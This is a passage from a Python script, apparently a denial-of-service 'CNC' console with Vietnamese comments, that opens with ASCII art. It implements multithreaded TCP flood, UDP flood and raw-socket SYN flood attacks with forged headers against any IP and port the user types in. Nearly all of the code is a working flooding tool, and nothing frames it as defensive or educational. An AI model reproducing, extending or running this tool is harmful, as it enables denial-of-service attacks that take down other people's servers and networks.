⣇⣇⣇⣇   ⠆⣇⠇       ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣷⣷⣷⣧⣧⣧⣧⣧⣧⣧⣧⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣷⣿⣷⣷⣷⣿⣿⣇  ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣿
⣇⣇⣇⣇⠇   ⠆⣇⠆       ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣷⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣷⣿⣿⣇   ⣇⣇⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿
⣇⣇⣇⣇⣇⠆    ⠇       ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷   ⠇⣇⠇⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿
⣇⣇⣇⣇⣇⣇            ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧   ⠆⣇⣇⠄⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿
⠇⣇⣇⣇⣇⣇⣇            ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇    ⣇⣇⠇ ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿
 ⠆⣇⣇⣇⣇⣇⠇           ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄    ⠇⣇⣇⠄ ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣷
⠄  ⣇⣇⣇⣇⣇⠇           ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇     ⠄⣇⣇⣇  ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣿⣿⣿
⣇⠄  ⠇⣇⣇⣇⣇⠆          ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇       ⣇⣇⣇⠆ ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣷
⣇⣇⠇   ⣇⣇⣇⣇⠆         ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇        ⠄⣇⣇⣇  ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣷
⣇⣇⣇⣇   ⠄⠇⣇⣇⠇         ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆          ⣇⣇⣇⠆  ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣧
⣇⣇⣇⣇⣇⠇   ⠄⣇⣇⠇        ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇⣇⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄            ⣇⣇⣇  ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣷⠆    ⣷
 ⠆⠇⣇⣇⣇⣇⠆    ⠇⣇⠄       ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣧⣧⣇⣧⣧⣧⣧⣷⣧⣧⣷⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆              ⠇⣇⣇⠇⣷⣿⣇⣇⣇⣇⣇⣇⣇⣇⠄    ⠄⣿⣿
    ⠆⠇⣇⣇⣇⠆    ⠆⠆      ⣇⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆                 ⣇⣇⣇⠄  ⠇⣇⣇⣇⣇⣇⣇⠇   ⠄⣷⣿⣿⣿
        ⠆⠇⠇⠆    ⠄     ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇ ⠄ ⠄⠄⠄⠄⠄   ⠄        ⠆⣇⣇⣇   ⣇⣇⣇⣇⣇⣇⣇⠇⠇⣷⣿⣿⣿⣿⣿⣿
                       ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧     ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⠇   ⣇⣇⣇⣇⣧⣷⠇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿
                       ⠇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄     ⠄⣧⣿⣿⣿⣿⣧⠆         ⠄ ⠄⠄⠄⠄⠄⠄⠄ ⣿⣿⣿⣿⣿⠄  ⠄⣇⣇⣇⣇⣿⣿⣇⣇⣇⣇⣇⣇⠇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿
                       ⠄⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣿⣷⣇⠆        ⠄⠇⣇⣷⣿⣿⠆                        ⠄⠄⣿⣷⣷⣧⣧⣧⣧⣇⣷⣿⣿⣿⣿   ⠇⣇⣇⣇⣇⣿⣿⣇⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇                                           ⠄⠆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿   ⣇⣇⣇⣇⣧⣿⣷⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇ ⠄⠄⠄⠄⠄                                     ⠄⠆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  ⠆⣇⣇⣇⠇⣷⣿⣧⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⠄⠄⠄⠄⠄⠄⠄⠄       ⣇⣇⣇⣇⣇⣇⣇⣇⣇⣇ ⠄⠄⠄⠄⠄⠄⠄⠄⠄                                 ⠄⠆⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣷  ⣇⣇⣇⣇⣧⣿⣿⣇⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
           ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇⠆      ⠄  ⠄⠆⣧⣿⣿⠇                           ⠄⠄⣧⠇⠆⠄⠆⠆⣇⣿⣿⣿⣿⣿⣧ ⠄⣇⣇⣇⠇⣿⣿⣿⣇⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿            ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄ ⣇⣇⣇⣇⣇⣇⣇⣇⣇⠇ ⠄⠄    ⠄⣷⣿⣿⣿⣿⣿⣿⣷⠄                         ⠄        ⣧⣿⣿⣿⣿⠇ ⠇⣇⣇⣇⣇⣿⣿⣿⣇⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄            ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠆⣇⣇⣇⣇⣇⣇⣇⣇⣇        ⠄⠆⣷⣷⠇⠄    ⠄                       ⠄ ⠄⠄⠄⠄⠄  ⠇⣿⣿⣿⣿⠄ ⣇⣇⣇⣇⣷⣿⣿⣷⣇⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧             ⠄⠄⠄⠄⠄⠄⠄⠄⠄ ⣇⣇⣧⣧⣧⣧⣇⣇⣇⣷⣷⠆⠄            ⠄⠄⠄                       ⠄ ⠄⠄⠄    ⠄⣿⣿⣿⣿ ⠄⣇⣇⣇⣇⣿⣿⣿⣧⣇⣇⣇⣇⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠆             ⠄⠄⠄⠄ ⠆⣿⣿⣿⣇⣇⣧⣧⣇⣇⣇⣇⣿⣿⣿⣿⣿⠇         ⠄⠄⠄⠄⠄                      ⠄ ⠄⠄     ⠄⣿⣿⣿⣿ ⠇⣇⣇⣇⣇⣿⣿⣿⣧⣇⣇⣇⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿              ⠄⠄⣧⣿⣿⣿⣿⣧⣇⣇⣧⣧⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⠇        ⠄⠄⠄⠄⠄ ⠄                            ⣇⣿⣿⣿⣿ ⣇⣇⣇⣇⣷⣿⣿⣷⣇⣇⣇⣇⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
"""

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self):
        self.running = False
        self.stats = {'total_packets': 0, 'total_connections': 0}
        self.lock = threading.Lock()
        
    def update_stats(self, packets=0, connections=0):
        with self.lock:
            self.stats['total_packets'] += packets
            self.stats['total_connections'] += connections
    
    def create_payload(self, size):
        """Tạo payload ngẫu nhiên"""
        return os.urandom(size)
    
    # ========== TCP FLOOD ==========
    def tcp_flood_worker(self, ip, port, packet_size, burst_size, duration):
        """TCP Flood worker"""
        start_time = time.time()
        payload = self.create_payload(packet_size)
        
        while self.running and (time.time() - start_time) < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(2)
                sock.connect((ip, port))
                
                for _ in range(burst_size):
                    sock.sendall(payload)
                    self.update_stats(packets=1)
                
                sock.close()
                self.update_stats(connections=1)
                
            except:
                pass
    
    def tcp_flood(self, ip, port, duration, threads=200, packet_size=1024, burst_size=10):
        """TCP Flood - 1 connection = N packets"""
        self.running = True
        self.stats = {'total_packets': 0, 'total_connections': 0}
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.tcp_flood_worker, args=(ip, port, packet_size, burst_size, duration))
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Stats loop
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            time.sleep(1)
        
        self.running = False
        return self.stats
    
    # ========== UDP FLOOD ==========
    def udp_flood_worker(self, ip, port, packet_size, duration):
        """UDP Flood worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
        payload = self.create_payload(packet_size)
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                sock.sendto(payload, (ip, port))
                self.update_stats(packets=1)
            except:
                pass
        
        sock.close()
    
    def udp_flood(self, ip, port, duration, threads=200, packet_size=1024):
        """UDP Flood - High throughput"""
        self.running = True
        self.stats = {'total_packets': 0, 'total_connections': 0}
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.udp_flood_worker, args=(ip, port, packet_size, duration))
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            time.sleep(1)
        
        self.running = False
        return self.stats
    
    # ========== SYN FLOOD (RAW SOCKET) ==========
    def syn_flood_worker(self, ip, port, duration):
        """SYN Flood - Cần root"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            return
        
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Tạo IP header
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    0x45, 0, 40, 0, 0x4000, 64, socket.IPPROTO_TCP,
                    0, socket.inet_aton('0.0.0.0'), socket.inet_aton(ip))
                
                # Tạo TCP header
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 2**32 - 1)
                tcp_header = struct.pack('!HHLLBBHHH',
                    src_port, port, seq, 0, 0x50, 0x02, 0, 0, 0)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (ip, 0))
                self.update_stats(packets=1)
                
            except:
                pass
        
        sock.close()
    
    def syn_flood(self, ip, port, duration, threads=100):
        """SYN Flood - Cần root"""
        print_gradient("⚠️  SYN Flood cần quyền root!", 0, 0.5)
        
        self.running = True
        self.stats = {'total_packets': 0, 'total_connections': 0}
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.syn_flood_worker, args=(ip, port, duration))
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            time.sleep(1)
        
        self.running = False
        return self.stats


# ==================== CNC INTERFACE ====================
class CNCInterface:
    def __init__(self):
        self.attack_engine = AttackEngine()
        self.current_mode = None
        self.prompt_color = Colors.rgb(236, 72, 153)
        self.prompt_text = "Admin$Quan#miku¢"
        
    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_header(self):
        self.clear()
        lines = ASCII_ART.split('\n')
        for i, line in enumerate(lines):
            if line.strip():
                t = i / max(len(lines) - 1, 1)
                r, g, b = get_gradient_color(t)
                print(f"{Colors.rgb(r, g, b)}{line}{Colors.RESET}")
            else:
                print()
    
    def print_methods(self):
        """Hiển thị methods menu với gradient"""
        self.clear()
        
        print_gradient("╔═══════════════════════════════════════════════════════════════════", 0, 0.2)
        print_gradient("║                 ╦ ╦╔═ ╦ ╦                                           ", 0, 0.3)
        print_gradient("║                 ║║║ ║ ╠╩╗ ║ ║                                   ", 0.3, 0.5)
        print_gradient("║                 ╩ ╩ ╩ ╩ ╚═╚═╝                                   ", 0.5, 0.7)
        print_gradient("╠═══════════════════════════════════════════════════════════════════", 0.7, 0.8)
        print_gradient("║                          ATTACK METHODS                          ║", 0.8, 1)
        print_gradient("╠═══════════════════════════════════════════════════════════════════", 0, 0.1)
        print_gradient("║                                                                  ", 0.1, 0.2)
        print_gradient("║   ┌─────────────────────────────────────────────────────────────   ", 0.2, 0.3)
        print_gradient("║   │  -quantcp      │  TCP FLOOD - 1 CONN = N PACKET           ", 0.3, 0.4)
        print_gradient("║   │  -quansyn      │  SYN FLOOD - RAW SOCKET (cần root)       ", 0.4, 0.5)
        print_gradient("║   │  -quanudp      │  UDP FLOOD - HIGH THROUGHPUT              ", 0.5, 0.6)
        print_gradient("║   └─────────────────────────────────────────────────────────────   ", 0.6, 0.7)
        print_gradient("╠═══════════════════════════════════════════════════════════════════", 0.7, 0.8)
        print_gradient("║   Author  : QUÂN                                                ", 0.8, 0.9)
        print_gradient("║   SENT BY : NAKANO MIKU                                         ", 0.9, 1)
        print_gradient("╚═══════════════════════════════════════════════════════════════════", 0, 0.1)
        print()
    
    def print_attack_status(self, ip, port, time_sec, method):
        """Hiển thị trạng thái tấn công"""
        self.clear()
        
        # Header với gradient
        print_gradient("╔═══════════════════════════════════════════════════════════════╗", 0, 0.2)
        print_gradient("║                    🚀🚀 ATTACK SENT 🚀🚀                        ║", 0.2, 0.5)
        print_gradient("╚═══════════════════════════════════════════════════════════════╝", 0.5, 0.8)
        print()
        
        # Thông tin attack
        info_lines = [
            (f"   🔥 Method  : {method.upper()}", (236, 72, 153)),
            (f"   📡 IP      : {ip}", (96, 165, 250)),
            (f"   🔌 PORT    : {port}", (34, 211, 238)),
            (f"   ⏱️  TIME    : {time_sec}s", (124, 58, 237)),
            (f"   👤 Author  : QUÂN", (168, 85, 247)),
            (f"   💌 SENT BY : NAKANO MIKU", (139, 92, 246)),
        ]
        
        for text, color in info_lines:
            print(f"{Colors.rgb(color[0], color[1], color[2])}{text}{Colors.RESET}")
        
        print()
        print_gradient("╔═══════════════════════════════════════════════════════════════╗", 0, 0.3)
        print_gradient("║                       🔥 ATTACKING 🔥                           ║", 0.3, 0.6)
        print_gradient("╚═══════════════════════════════════════════════════════════════╝", 0.6, 0.9)
        print()
    
    def print_stats(self, stats, duration):
        """Hiển thị thống kê"""
        elapsed = duration
        packets_per_sec = stats['total_packets'] / elapsed if elapsed > 0 else 0
        
        print()
        print_gradient("╔═══════════════════════════════════════════════════════════════╗", 0, 0.2)
        print_gradient("║                       📊 STATISTICS 📊                         ║", 0.2, 0.5)
        print_gradient("╚═══════════════════════════════════════════════════════════════╝", 0.5, 0.8)
        print()
        
        stats_data = [
            (f"   📦 Total Packets   : {stats['total_packets']:,}", (96, 165, 250)),
            (f"   🔌 Total Connections: {stats['total_connections']:,}", (34, 211, 238)),
            (f"   ⚡ Packets/sec     : {packets_per_sec:,.0f}", (236, 72, 153)),
            (f"   ⏱️  Duration        : {elapsed:.1f}s", (168, 85, 247)),
        ]
        
        for text, color in stats_data:
            print(f"{Colors.rgb(color[0], color[1], color[2])}{text}{Colors.RESET}")
        
        print()
        print_gradient("╔═══════════════════════════════════════════════════════════════╗", 0, 0.3)
        print_gradient("║                       ATTACK DONE                             ║", 0.3, 0.6)
        print_gradient("╚═══════════════════════════════════════════════════════════════╝", 0.6, 0.9)
        print()
    
    def process_command(self, cmd):
        """Xử lý lệnh từ user"""
        if not cmd.strip():
            return True
        
        # Lệnh methods
        if cmd.lower() == 'methods':
            self.print_methods()
            return True
        
        # Lệnh clear
        if cmd.lower() == 'clear':
            self.print_header()
            return True
        
        # Parse lệnh tấn công
        parts = cmd.split()
        if len(parts) < 5:
            print(f"{Colors.rgb(255, 80, 80)}[!] Usage: -quantcp <IP> <PORT> <TIME> <THREADS>{Colors.RESET}")
            print(f"{Colors.rgb(255, 80, 80)}       -quanudp <IP> <PORT> <TIME> <THREADS>{Colors.RESET}")
            print(f"{Colors.rgb(255, 80, 80)}       -quansyn <IP> <PORT> <TIME> <THREADS>{Colors.RESET}")
            return True
        
        method = parts[0].lower()
        
        # Phân tích tham số
        try:
            ip = parts[1]
            port = int(parts[2])
            duration = int(parts[3])
            threads = int(parts[4])
        except ValueError:
            print(f"{Colors.rgb(255, 80, 80)}[!] Invalid parameters!{Colors.RESET}")
            return True
        
        # Hiển thị trạng thái
        self.print_attack_status(ip, port, duration, method)
        
        # Thực thi tấn công
        print(f"{Colors.rgb(96, 165, 250)}[+] Starting attack...{Colors.RESET}\n")
        
        if method == '-quantcp':
            stats = self.attack_engine.tcp_flood(ip, port, duration, threads, packet_size=2*1024*1024, burst_size=200)
        elif method == '-quanudp':
            stats = self.attack_engine.udp_flood(ip, port, duration, threads, packet_size=4096)
        elif method == '-quansyn':
            stats = self.attack_engine.syn_flood(ip, port, duration, threads)
        else:
            print(f"{Colors.rgb(255, 80, 80)}[!] Unknown method: {method}{Colors.RESET}")
            return True
        
        # Hiển thị kết quả
        self.print_stats(stats, duration)
        
        input(f"{Colors.rgb(96, 165, 250)}Press Enter to continue...{Colors.RESET}")
        self.print_header()
        
        return True
    
    def run(self):
        """Chạy CNC interface"""
        self.print_header()
        
        print(f"{Colors.rgb(96, 165, 250)}[+] CNC Ready{Colors.RESET}")
        print(f"{Colors.rgb(34, 211, 238)}[+] Type 'methods' to see attack methods{Colors.RESET}")
        print(f"{Colors.rgb(139, 92, 246)}[+] SENT BY : NAKANO MIKU{Colors.RESET}\n")
        
        while True:
            try:
                prompt = f"{Colors.rgb(236, 72, 153)}{self.prompt_text}{Colors.rgb(168, 85, 247)} : {Colors.RESET}"
                cmd = input(prompt)
                
                if not self.process_command(cmd):
                    break
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.rgb(236, 72, 153)}Goodbye!{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.rgb(255, 80, 80)}[!] Error: {e}{Colors.RESET}")


# ==================== MAIN ====================
if __name__ == "__main__":
    try:
        cnc = CNCInterface()
        cnc.run()
    except Exception as e:
        print(f"Error: {e}")